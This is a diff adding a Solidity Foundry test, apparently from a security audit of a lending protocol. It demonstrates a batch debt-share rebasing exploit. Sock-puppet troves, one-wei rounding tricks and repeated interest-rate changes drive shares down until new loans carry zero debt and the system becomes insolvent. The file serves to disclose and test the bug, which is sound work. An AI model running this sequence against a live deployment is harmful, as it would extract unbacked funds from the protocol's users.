@@ -1,0 +1,201 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "./TestContracts/DevTestSetup.sol";
+
+contract RebasingBatchShares is DevTestSetup {
+    bool WITH_INTEREST = true; // Do we need to tick some interest to cause a rounding error?
+
+    function testBatchRebaseToSystemInsolvency() public {
+        // === EXTRA SETUP === //
+        // Open Trove
+        priceFeed.setPrice(2000e18);
+        // Extra Debt (irrelevant / Used to not use deal)
+        openTroveNoHints100pct(C, 100 ether, 100e21, MAX_ANNUAL_INTEREST_RATE);
+        vm.startPrank(C);
+        boldToken.transfer(A, boldToken.balanceOf(C));
+        vm.stopPrank();
+
+        // === 1: Setup Batch Rebase === ///
+
+        // Open 2 troves so we get enough interest
+        // 1 will be redeemed down to 1 wei
+        uint256 ATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);
+        // Sock Puppet Trove | Opened second so we can redeem this one | We need to redeem this one so we can inflate the precision loss
+        uint256 BTroveId = openTroveAndJoinBatchManager(B, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);
+
+        // MUST accrue to rebase shares
+        // Limit to one block so this attack is basically unavoidable
+        if (WITH_INTEREST) {
+            vm.warp(block.timestamp + 12);
+        }
+
+        LatestBatchData memory b4Batch = troveManager.getLatestBatchData(address(B));
+
+        // TODO: Open A, Mint 1 extra (forgiven to A)
+        _addOneDebtAndEnsureItDoesntMintShares(ATroveId, A);
+        /// @audit MED impact
+
+        LatestBatchData memory afterBatch = troveManager.getLatestBatchData(address(B));
+
+        assertEq(
+            b4Batch.entireDebtWithoutRedistribution + 1,
+            afterBatch.entireDebtWithoutRedistribution,
+            "Debt is credited to batch"
+        );
+
+        // Closing A here will credit to B and Batch, that's ok but not enough
+        LatestTroveData memory trove = troveManager.getLatestTroveData(BTroveId);
+        uint256 bEntireDebtB4 = trove.entireDebt;
+
+        vm.startPrank(A);
+        collateralRegistry.redeemCollateral(bEntireDebtB4, 100, 1e18); // 2 debt, 1 share (hopefully)
+        vm.stopPrank();
+
+        uint256 sharesAfterRedeem = _getBatchDebtShares(BTroveId);
+        assertEq(sharesAfterRedeem, 1, "Must be down to 1, rebased");
+
+        // Let's have B get 1 share, 2 debt | Now it will be 1 | 1 because A is socializing that share
+        LatestTroveData memory bAfterRedeem = troveManager.getLatestTroveData(BTroveId);
+        assertEq(bAfterRedeem.entireDebt, 1, "Must be 1, Should be 2 for exploit"); // NOTE: it's one because of the division on total shares
+
+        // Close A (also remove from batch is fine)
+        closeTrove(A, ATroveId);
+
+        // Now B has rebased the Batch to 1 Share, 2 Debt
+        LatestTroveData memory afterClose = troveManager.getLatestTroveData(BTroveId);
+        assertEq(afterClose.entireDebt, 2, "Becomes 2"); // Note the debt becomes 2 here because of the round down on what A needs to repay
+
+        // === 2: Rebase to 100+ === //
+        // We need to rebase to above 100
+        uint256 x;
+        while (x++ < 100) {
+            // Each iteration adds 1 wei of debt to the Batch, while leaving the Shares at 1
+            _openCloseRemainderLoop(1, BTroveId);
+        }
+
+        _logTrovesAndBatch(B, BTroveId);
+
+        // === 3: Compound gains === //
+        // We can now spam
+        // Each block, we will rebase the share by charging the upfrontFee
+        // This endsup taking
+        uint256 y;
+        while (y < 2560) {
+            _triggerInterestRateFee();
+            y++;
+
+            LatestTroveData memory troveData = troveManager.getLatestTroveData(BTroveId);
+            // This flags that we can borrow for free
+            if (troveData.entireDebt > 4000e18 + 1) {
+                break;
+            }
+        }
+        // 2391 blocks
+        console2.log("We have more than 2X MIN_DEBT of rebase it took us blocks:", y);
+
+        _logTrovesAndBatch(B, BTroveId);
+
+        // === 4: Free Loans === //
+        uint256 debtB4 = borrowerOperations.getEntireSystemDebt();
+        // We can now open a new Trove
+        uint256 anotherATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MIN_ANNUAL_INTEREST_RATE);
+        LatestTroveData memory anotherATrove = troveManager.getLatestTroveData(anotherATroveId);
+        uint256 aDebt = anotherATrove.entireDebt;
+
+        // It will pay zero debt
+        assertEq(aDebt, 0, "Forgiven");
+
+        uint256 balB4 = boldToken.balanceOf(A);
+        closeTrove(A, anotherATroveId);
+        uint256 balAfter = boldToken.balanceOf(A);
+
+        // And we can repeat this to get free debt
+        uint256 debtAfter = borrowerOperations.getEntireSystemDebt();
+
+        assertGt(debtAfter, debtB4, "Debt should have increased");
+        assertLt(balB4, balAfter, "Something should have benn paid");
+    }
+
+    uint128 subTractor = 1;
+
+    // Trigger interest fee by changing the fee to it -1
+    function _triggerInterestRateFee() internal {
+        // Add Fee?
+        vm.warp(block.timestamp + 1);
+        vm.startPrank(B);
+        borrowerOperations.setBatchManagerAnnualInterestRate(1e18 - subTractor++, 0, 0, type(uint256).max);
+        vm.stopPrank();
+    }
+
+    function _logTrovesAndBatch(address batch, uint256 /* troveId */ ) internal view {
+        console2.log("");
+        console2.log("Troves And Batch");
+        // Log Batch Debt
+        uint256 batchDebt = _getLatestBatchDebt(batch);
+        console2.log("Batch Debt:           ", batchDebt);
+        // Log all Batch shares
+        uint256 batchShares = _getTotalBatchDebtShares(batch);
+        console2.log("Batch Shares:         ", batchShares);
+        // Log ratio
+        uint256 batchSharesRatio = batchShares * DECIMAL_PRECISION / batchDebt;
+        console2.log("shares / batch ratio: ", batchSharesRatio);
+
+        // Trove
+        /*
+        LatestTroveData memory troveData = troveManager.getLatestTroveData(troveId);
+        console2.log("Trove Debt:           ", troveData.entireDebt);
+        uint256 troveBatchShares = _getBatchDebtShares(troveId);
+        console2.log("Trove Shares:         ", troveBatchShares);
+        uint256 troveSharesRatio = troveBatchShares * DECIMAL_PRECISION / troveData.entireDebt;
+        console2.log("Trove ratio:          ", troveSharesRatio);
+        */
+    }
+
+    function _openCloseRemainderLoop(uint256 amt, uint256 BTroveId) internal {
+        LatestTroveData memory troveBefore = troveManager.getLatestTroveData(BTroveId);
+
+        // Open
+        uint256 ATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);
+
+        // Add debt that wont' be credited (fibonacci)
+        _addDebtAndEnsureItDoesntMintShares(ATroveId, A, amt); // TODO: Needs to be made to scale
+
+        closeTrove(A, ATroveId); // Close A (also remove from batch is fine)
+
+        LatestTroveData memory troveAfter = troveManager.getLatestTroveData(BTroveId);
+        assertGt(troveAfter.entireDebt, troveBefore.entireDebt, "we're rebasing");
+    }
+
+    function _addDebtAndEnsureItDoesntMintShares(uint256 troveId, address caller, uint256 amt) internal {
+        (,,,,,,,,, uint256 b4BatchDebtShares) = troveManager.Troves(troveId);
+
+        withdrawBold100pct(caller, troveId, amt);
+
+        (,,,,,,,,, uint256 afterBatchDebtShares) = troveManager.Troves(troveId);
+
+        assertEq(b4BatchDebtShares, afterBatchDebtShares, "Same Shares");
+    }
+
+    function _addOneDebtAndEnsureItDoesntMintShares(uint256 troveId, address caller) internal {
+        _addDebtAndEnsureItDoesntMintShares(troveId, caller, 1);
+    }
+
+    function _getLatestBatchDebt(address batch) internal view returns (uint256) {
+        LatestBatchData memory batchData = troveManager.getLatestBatchData(batch);
+
+        return batchData.entireDebtWithoutRedistribution;
+    }
+
+    function _getBatchDebtShares(uint256 troveId) internal view returns (uint256) {
+        (,,,,,,,,, uint256 batchDebtShares) = troveManager.Troves(troveId);
+
+        return batchDebtShares;
+    }
+
+    function _getTotalBatchDebtShares(address batch) internal view returns (uint256) {
+        (,,,,,,, uint256 allBatchDebtShares) = troveManager.getBatch(batch);
+
+        return allBatchDebtShares;
+    }
+}
